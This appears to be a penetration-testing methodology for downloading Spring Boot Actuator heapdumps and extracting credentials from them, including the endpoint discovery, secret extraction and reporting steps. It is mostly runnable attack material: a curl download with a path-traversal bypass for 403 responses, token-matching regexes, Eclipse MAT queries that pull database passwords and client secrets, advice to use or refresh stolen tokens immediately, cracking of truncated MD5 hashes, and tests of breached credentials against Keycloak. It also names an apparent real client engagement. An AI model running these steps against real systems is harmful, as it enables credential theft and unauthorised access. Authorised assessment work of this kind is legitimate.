# Heapdump Secret Extraction

Methodology for extracting credentials, tokens, and configuration from Java HPROF heapdump files obtained via Spring Boot Actuator.

## Obtaining the Heapdump

```bash
# Download (may take 15-60s depending on heap size)
curl -o heapdump.hprof "https://target.com/actuator/heapdump" --max-time 120

# Check size (typical: 10MB-500MB)
ls -lh heapdump.hprof
```

**Common responses:**
- 200 + data → success (Critical finding)
- 504 → timeout (heap too large, try longer `--max-time 300`)
- 403 → blocked (try path traversal: `/context/..;/actuator/heapdump`)
- 404 → endpoint disabled

## Quick Wins Before MAT (5-minute triage)

Run these IMMEDIATELY after downloading a heapdump, before investing time in Eclipse MAT setup:

```bash
HEAP="heapdump.hprof"

# 1. Known token format patterns (highest ROI — exact regex, low false positives)
echo "=== Known Token Formats ==="
strings -n 10 "$HEAP" | grep -oE "ghp_[a-zA-Z0-9]{36}"                    # GitHub PAT
strings -n 10 "$HEAP" | grep -oE "ghs_[a-zA-Z0-9]{36}"                    # GitHub App
strings -n 10 "$HEAP" | grep -oE "glpat-[a-zA-Z0-9_-]{20}"               # GitLab PAT
strings -n 10 "$HEAP" | grep -oE "AKIA[A-Z0-9]{16}"                       # AWS Access Key
strings -n 10 "$HEAP" | grep -oE "ya29\.[a-zA-Z0-9_-]{50,}"              # GCP OAuth
strings -n 10 "$HEAP" | grep -oE "AIza[0-9A-Za-z_-]{35}"                  # Google API key
strings -n 10 "$HEAP" | grep -oE "xox[baprs]-[a-zA-Z0-9-]+"              # Slack
strings -n 10 "$HEAP" | grep -oE "sk-[a-zA-Z0-9]{20,}"                    # OpenAI/Stripe
strings -n 10 "$HEAP" | grep -oE "snyk-[a-zA-Z0-9-]{36}"                  # Snyk (alt)
strings -n 10 "$HEAP" | grep -oE "dt0c01\.[A-Z0-9]{24}\.[A-Z0-9]{64}"    # Dynatrace API

# 2. UUIDs (Snyk tokens, client secrets, API keys are often UUID format)
echo "=== UUIDs (potential tokens) ==="
strings -n 36 "$HEAP" | grep -oE "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}" | sort -u | head -50

# 3. JWTs (service account tokens, refresh tokens)
echo "=== JWTs ==="
strings -n 50 "$HEAP" | grep -oE "eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}" | head -20

# 4. Connection strings (immediate credential extraction)
echo "=== Connection Strings ==="
strings -n 10 "$HEAP" | grep -iE "(jdbc:|redis://|amqp://|mongodb://|postgres://|mysql://)" | sort -u

# 5. Config class names (tells you what to query in MAT)
echo "=== Config Classes (for MAT targeting) ==="
strings -n 10 "$HEAP" | grep -oE "[a-z]+\.[a-z]+\.[a-z]+\.(Secret|Token|Credential|Config|Properties)[A-Za-z]*" | sort -u
```

**Decision after triage:**
- Found tokens/JWTs → validate immediately, continue with MAT for more
- Found config class names but no values → MAT is required (values are in object fields)
- Found nothing → heapdump may be from a minimal service; still use MAT (char[] search)

**Key lesson (BFI Finance):** `strings | grep` found config property NAMES (`ServiceSecretKeyConfigProperties.SecretKeyElement(name=, key=, ownerKey=`) but NOT the actual secret values. A team member using Eclipse MAT with targeted OQL on that exact class extracted the Snyk token. Always follow up with MAT.

## Extraction Methods (ordered by effectiveness)

### Method 1: Eclipse MAT (Best for object graph traversal)

```bash
# Install (macOS)
brew install --cask eclipse-memory-analyzer

# Install (Linux)
wget https://www.eclipse.org/downloads/download.php?file=/mat/1.15.0/rcp/MemoryAnalyzer-1.15.0.20231206-linux.gtk.x86_64.zip
unzip MemoryAnalyzer-*.zip -d /opt/mat
```

**When MAT is REQUIRED (not optional):**
- `strings` found config class names but no values (e.g., `SecretKeyConfigProperties.SecretKeyElement(name=, key=, ownerKey=)`)
- You need to correlate a property NAME with its VALUE (they're separate objects in heap)
- Heapdump is from a Spring Boot app with `@ConfigurationProperties` classes
- You found UUIDs via strings but can't determine which service they belong to

#### Step-by-Step MAT Workflow

**Step 1: Open and parse the heapdump**
```
File → Open Heap Dump → select .hprof file
→ Wait for index build (1-5 min for 100MB-1GB heaps)
→ If prompted for leak report: click "Skip" (we want OQL, not leak analysis)
```

**Step 2: Identify target classes (from strings triage)**
```
Navigate: Window → OQL (or click the OQL icon in toolbar)

-- First: find what config classes exist in this heap
SELECT DISTINCT c.@className FROM INSTANCEOF java.lang.Object c
WHERE c.@className LIKE "%Config%Properties%"

-- Also check for:
SELECT DISTINCT c.@className FROM INSTANCEOF java.lang.Object c
WHERE c.@className LIKE "%Secret%"
OR c.@className LIKE "%Credential%"
OR c.@className LIKE "%DataSource%"
```

**Step 3: Extract secrets from config classes**
```sql
-- GENERIC: Find all Spring Environment property sources (catches everything)
SELECT p.name.toString(), p.source FROM org.springframework.core.env.MapPropertySource p

-- GENERIC: All PropertySource entries (Spring Boot externalized config)
SELECT toString(entry.key), toString(entry.value)
FROM java.util.HashMap$Node entry
WHERE inbound(entry).@className LIKE "%PropertySource%"

-- Find String values referenced BY secret/token config objects
SELECT toString(obj) FROM java.lang.String obj
WHERE inbound(obj).@className LIKE ".*[Ss]ecret.*|.*[Tt]oken.*|.*[Cc]redential.*"

-- Find all char[] that look like UUIDs (Snyk tokens, API keys)
SELECT toString(c) FROM char[] c WHERE c.@length == 36

-- Find all char[] that look like JWTs
SELECT toString(c) FROM char[] c WHERE c.@length > 100 AND toString(c) LIKE "eyJ%"

-- Find all char[] that look like connection strings
SELECT toString(c) FROM char[] c WHERE toString(c) LIKE "jdbc:%"
SELECT toString(c) FROM char[] c WHERE toString(c) LIKE "redis://%"
SELECT toString(c) FROM char[] c WHERE toString(c) LIKE "amqp://%"

-- Target a specific config class (adapt per engagement)
-- Example: BFI's ServiceSecretKeyConfigProperties
SELECT obj.name.toString(), obj.key.toString(), obj.ownerKey.toString()
FROM com.example.config.ServiceSecretKeyConfigProperties$SecretKeyElement obj

-- Find HikariCP datasource URLs and passwords
SELECT toString(ds.jdbcUrl), toString(ds.username), toString(ds.password)
FROM com.zaxxer.hikari.HikariDataSource ds

-- Find Keycloak adapter config (client secrets)
SELECT toString(c.resource), toString(c.credentials)
FROM org.keycloak.representations.adapters.config.AdapterConfig c

-- Find all HashMap entries where key contains "password", "secret", "token"
SELECT toString(entry.key), toString(entry.value)
FROM java.util.HashMap$Node entry
WHERE toString(entry.key) LIKE "%password%"
OR toString(entry.key) LIKE "%secret%"
OR toString(entry.key) LIKE "%token%"
OR toString(entry.key) LIKE "%apiKey%"
OR toString(entry.key) LIKE "%api_key%"
```

**Step 4: Follow object references (when OQL isn't enough)**
```
When you find a config class but OQL can't extract the field value:

1. In OQL results, right-click the object → "List Objects" → "with outgoing references"
2. Expand the object tree:
   ConfigClass
   ├── name: String → value: char[] → "snyk-token"
   ├── key: String → value: char[] → "a1b2c3d4-e5f6-..."  ← THIS IS THE SECRET
   └── ownerKey: String → value: char[] → "org-xyz"

3. Right-click any String field → "Copy" → "Value" to extract

Alternative: Use "Inspector" panel (bottom-right) — shows field values when you click an object
```

**Step 5: Bulk export technique**
```
For large-scale extraction:
1. Run OQL query that returns many results
2. Right-click results table → "Copy" → "All Rows" → paste into text file
3. Or: File → Export → "Query Results" → CSV

For char[] bulk search:
SELECT toString(c), c.@length FROM char[] c
WHERE c.@length > 20 AND c.@length < 200
AND (toString(c) LIKE "%password%"
  OR toString(c) LIKE "eyJ%"
  OR toString(c) LIKE "%://%"
  OR toString(c) MATCHES "[0-9a-f]{8}-[0-9a-f]{4}-.*")
```

#### char[] Correlation Technique

**The core problem:** In Java heaps, a config key (`"spring.datasource.password"`) and its value (`"P@ssw0rd123"`) are stored as SEPARATE `String` objects, each containing a SEPARATE `char[]`. `strings` finds both independently but can't link them.

**MAT solves this via object graph traversal:**

```
HashMap$Node
├── key: String("spring.datasource.password") → char[]("spring.datasource.password")
└── value: String("P@ssw0rd123") → char[]("P@ssw0rd123")
```

**OQL to extract key-value pairs from Spring PropertySources:**
```sql
-- This is the MONEY QUERY — extracts resolved Spring config key=value pairs
SELECT toString(entry.key) AS property, toString(entry.value) AS secret_value
FROM java.util.HashMap$Node entry
WHERE inbound(inbound(entry)).@className LIKE "%PropertySource%"
AND (toString(entry.key) LIKE "%secret%"
  OR toString(entry.key) LIKE "%password%"
  OR toString(entry.key) LIKE "%token%"
  OR toString(entry.key) LIKE "%key%"
  OR toString(entry.key) LIKE "%credential%")
```

**When you know the class but not the field structure:**
```sql
-- Dump ALL fields of a config class to understand its structure
SELECT * FROM com.example.config.TargetConfigClass

-- Then in the results, expand each object to see field names and types
-- Right-click → "Show as Object Tree" to see the full structure
```

#### Decision Tree: strings vs MAT

```
Heapdump obtained
├── Run strings triage (5 min) — ALWAYS do this first
│   ├── Found JWTs, connection strings, known token formats?
│   │   └── YES → Validate immediately. Still run MAT for completeness.
│   ├── Found config class names (e.g., SecretKeyConfigProperties)?
│   │   └── YES → MAT REQUIRED — values are in object fields
│   ├── Found property placeholders (${setting.x.y.secret})?
│   │   └── YES → MAT REQUIRED — resolved values in PropertySource maps
│   └── Found nothing useful?
│       └── MAT REQUIRED — secrets may be in char[] not adjacent to keywords
│
├── MAT available?
│   ├── YES → Run full OQL extraction (Steps 2-5 above)
│   └── NO → Use Python hprof parser (Method 4) or heapdump_tool (Method 5)
│
└── Document findings regardless — exposed heapdump is Critical even without extraction
```

#### MAT Performance Tips

- **Large heaps (>500MB):** Increase MAT's JVM heap: edit `MemoryAnalyzer.ini`, set `-Xmx4g` or higher
- **Index caching:** After first parse, MAT creates `.index` files next to the `.hprof` — subsequent opens are faster
- **Remote analysis:** If heapdump is on a server, download locally for MAT (it needs random access to the file)
- **Partial heapdumps:** MAT may fail on truncated files — use `strings` + Python for partial data

### Method 2: jhat (JDK built-in, good for quick analysis)

```bash
jhat heapdump.hprof
# Opens web UI at http://localhost:7000
# Navigate to: All Classes → search for "Environment" or "DataSource"
```

### Method 3: strings + grep (Fast but incomplete — use as TRIAGE only)

**WARNING:** This method finds ~20% of secrets at best. It CANNOT follow Java object references. Always follow up with MAT or heapdump_tool for thorough extraction. The primary value of `strings` is quick triage to confirm the heapdump contains interesting classes/config, then switch to MAT for actual value extraction.

```bash
# Basic extraction (misses values in object fields)
strings -n 10 heapdump.hprof | grep -iE "(password|secret|token|jdbc:|redis:|amqp://)" | sort -u

# Search for specific patterns
strings -n 10 heapdump.hprof | grep -oE "eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}"  # JWT
strings -n 10 heapdump.hprof | grep -oE "https?://[a-zA-Z0-9._:-]+/realms/[a-zA-Z0-9_-]+"  # Keycloak URLs
strings -n 10 heapdump.hprof | grep -oE "[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"  # UUIDs (Snyk tokens, API keys)

# Known token format patterns (run ALL of these)
strings -n 10 heapdump.hprof | grep -oE "ghp_[a-zA-Z0-9]{36}"          # GitHub PAT
strings -n 10 heapdump.hprof | grep -oE "ghs_[a-zA-Z0-9]{36}"          # GitHub App token
strings -n 10 heapdump.hprof | grep -oE "glpat-[a-zA-Z0-9_-]{20}"      # GitLab PAT
strings -n 10 heapdump.hprof | grep -oE "AKIA[A-Z0-9]{16}"             # AWS Access Key
strings -n 10 heapdump.hprof | grep -oE "ya29\.[a-zA-Z0-9_-]{50,}"     # GCP OAuth token
strings -n 10 heapdump.hprof | grep -oE "AIza[0-9A-Za-z_-]{35}"        # Google API key
strings -n 10 heapdump.hprof | grep -oE "xox[baprs]-[a-zA-Z0-9-]+"     # Slack token
strings -n 10 heapdump.hprof | grep -oE "sk-[a-zA-Z0-9]{20,}"          # OpenAI/Stripe key
strings -n 10 heapdump.hprof | grep -oE "snyk-[a-zA-Z0-9-]{36}"        # Snyk token (alt format)
strings -n 10 heapdump.hprof | grep -oE "dt0c01\.[A-Z0-9]{24}\.[A-Z0-9]{64}"  # Dynatrace API token

# toString() representations (reveals config structure even without values)
strings -n 10 heapdump.hprof | grep -E "\.(Secret|Token|Credential|Config).*\(" | sort -u
```

**IMPORTANT:** `strings` alone is INSUFFICIENT for Java heapdumps. Resolved Spring config values are stored in Java object fields (char arrays inside String objects inside PropertySource maps). They won't appear as contiguous ASCII strings. Use Eclipse MAT or the Python method below for thorough extraction.

**Lesson learned (BFI Finance, May 2026):** Team member found a Snyk token (UUID format) using Eclipse MAT by querying the `ServiceSecretKeyConfigProperties` class directly. The same heapdump analyzed with `strings | grep` found the config property NAMES (`ServiceSecretKeyConfigProperties.SecretKeyElement(name=, key=, ownerKey=`) but NOT the actual values — because the values are stored as separate `char[]` objects linked by object references that only MAT can follow.

### Method 4: Python binary search (middle ground)

```python
import re

with open('heapdump.hprof', 'rb') as f:
    data = f.read()

# Search for URLs
urls = set(re.findall(rb'https?://[a-zA-Z0-9._:-]+/[a-zA-Z0-9/_.-]*', data))

# Search for JWTs
jwts = set(re.findall(rb'eyJ[a-zA-Z0-9_-]{20,}\.eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}', data))

# Search for connection strings
jdbc = set(re.findall(rb'jdbc:[a-zA-Z0-9]+://[^\x00\x01\x02]{10,100}', data))
redis = set(re.findall(rb'redis://[^\x00\x01\x02]{10,80}', data))
amqp = set(re.findall(rb'amqp://[^\x00\x01\x02]{10,80}', data))

# Search for Spring property names (reveals what config exists)
props = set(re.findall(rb'setting\.[a-zA-Z0-9._-]+', data))

# Search for Keycloak realm URLs
realms = set(re.findall(rb'https?://[a-zA-Z0-9._:-]+/realms/[a-zA-Z0-9_-]+', data))
```

### Method 5: heapdump_tool (purpose-built)

```bash
# https://github.com/wyzxxz/heapdump_tool
java -jar heapdump_tool.jar heapdump.hprof
# Automatically extracts: passwords, tokens, URLs, Spring config
```

## What to Search For

### High-Value Targets

| Target | Pattern | Severity if Found |
|--------|---------|-------------------|
| Database passwords | `jdbc:`, `spring.datasource.password` | Critical |
| Keycloak client secrets | `client_secret`, `clientSecret` | Critical |
| JWT signing keys | `jwt.secret`, `signing-key` | Critical |
| Service account tokens | `eyJ...` (JWT), UUID refresh tokens | Critical |
| API keys | `apiKey`, `api_key`, `SNYK_TOKEN`, `GITHUB_TOKEN` | High |
| Redis/RabbitMQ passwords | `redis://`, `amqp://`, `spring.redis.password` | High |
| Internal URLs | `*.svc.cluster.local`, `microservices-private.*` | Medium |
| Feature flags | `setting.feature.config.*` | Low-Medium |

### Spring Property Names (reveals architecture even without values)

```bash
strings -n 10 heapdump.hprof | grep -oE "setting\.[a-zA-Z0-9._-]+" | sort -u
# or
strings -n 10 heapdump.hprof | grep -oE "spring\.[a-zA-Z0-9._-]+" | sort -u
```

These property names reveal:
- All microservice integrations (`setting.*.microservices.rootUrl`)
- Feature flags (`setting.feature.config.*`)
- Queue bindings (`setting.queue.binding.*`)
- Third-party integrations (`setting.tongdun.*`, `setting.yellowAi.*`)

## Lessons from Real Engagements

1. **`strings` finds property NAMES but not VALUES**: Spring stores resolved values in `char[]` fields inside `String` objects inside `HashMap$Node` entries. The key and value are separate objects in memory — `strings` finds them independently but can't correlate them.

2. **Token validity**: Tokens extracted from heapdumps may be:
   - Still valid (if within TTL) → use immediately
   - Expired but refresh token works → exchange for new access token
   - Invalidated (session ended) → proves the pattern but can't use directly

3. **Service account tokens are most valuable**: Unlike user tokens (short-lived), service account tokens often have longer TTLs and higher privileges (realm-admin, impersonation).

4. **Heapdump size vs timeout**: Large heaps (>100MB) may timeout on the first request. Try:
   - Longer timeout (`--max-time 600`)
   - Resume download (`curl -C -`)
   - Range requests for chunked download: `curl --range 0-20971520` (20MB chunks)
   - Multiple attempts (GC may reduce heap between requests)
   - **Lesson (BFI, 634MB heap):** Partial downloads (first 50MB) found Spring property placeholder NAMES (`${setting.keycloak.microservices.clientSecret}`) but NOT resolved values. Resolved values are typically in later heap segments within PropertySource HashMap entries. For credential extraction, you MUST get the full file or use Eclipse MAT on whatever you can download.

5. **Partial heapdump analysis strategy**: When full download fails:
   - Download in 20MB chunks via `--range` header
   - Run `strings` on each chunk for quick wins (JWTs, connection strings, UUIDs)
   - Property placeholder names (e.g., `${setting.service.internal.key}`) confirm secrets EXIST but don't give values
   - Infrastructure details (health endpoint: DB type, versions, queue names) are still valuable from partial data
   - Document the heapdump as Critical regardless — the finding is the exposed endpoint, not what you extracted

5. **The heapdump itself is the finding**: Even if you can't extract usable credentials, a downloadable heapdump is Critical because:
   - It WILL contain secrets (Spring stores all config in memory)
   - A more skilled attacker with Eclipse MAT WILL extract them
   - The endpoint should never be exposed

## CTI Credential Database Patterns

When CTI-sourced credential databases are obtained (from breach monitoring, dark web, or team members), common patterns:

### Truncated MD5 Hashes

Some internal applications store MD5 hashes with the last character stripped (31 chars instead of 32). This is likely a database column truncation bug.

```python
import hashlib

# Identify: hash is 31 hex chars (not 32)
# Example: "202cb962ac59075b964b07152d234b7" = MD5("123")[:31]

def crack_truncated_md5(target_hash, wordlist):
    """Crack MD5 hashes that are missing the last character."""
    for word in wordlist:
        full_hash = hashlib.md5(word.encode()).hexdigest()
        if full_hash[:31] == target_hash:
            return word
    return None

# Common weak passwords found in Indonesian enterprise breaches:
# "123" (most common), "1234", "12345", "123456", "password", "abc123"
```

### Credential Testing Against Keycloak/SSO

CTI credentials from internal apps (e.g., myfocus, legacy CRM) often DON'T work on Keycloak because:
1. **Different auth system** — legacy app has its own user table, not federated with SSO
2. **Google Workspace SSO** — Keycloak delegates to Google, so the password is the Google password (not the app password)
3. **Password rotation** — credentials may have been rotated after the breach

**Testing order:**
1. Try email format (`user@company.com`) on all Keycloak realms
2. Try username-only format (`firstname.lastname`)
3. Try on nonprod instances (less likely to have rotated)
4. If all fail, document as "breach confirmed, credentials not valid on SSO" — the finding is still Critical due to PII exposure and weak password policy evidence

### Reporting CTI Findings

Even when credentials don't grant access, document:
- Password policy failure (MD5 hashing, weak passwords like "123")
- PII exposure (KTP, NPWP, bank accounts, phone numbers)
- Employee data exposure (personal emails, roles, job titles)
- The COMBINATION with other findings (open redirect + valid email = targeted phishing)

---

## Reporting

```markdown
## [FINDING-N] Downloadable JVM Heapdump (Credential Extraction)

**Severity:** Critical
**CVSS 3.1:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

### What was extracted:
- Service account token: {user} (role: {role})
- Spring config properties: {count} settings revealed
- Internal URLs: {list}
- Database type: {PostgreSQL/MySQL/etc}

### What could be extracted with deeper analysis:
- Database passwords (in Spring DataSource objects)
- JWT signing keys (in SecurityConfig objects)
- All API keys and client secrets
```
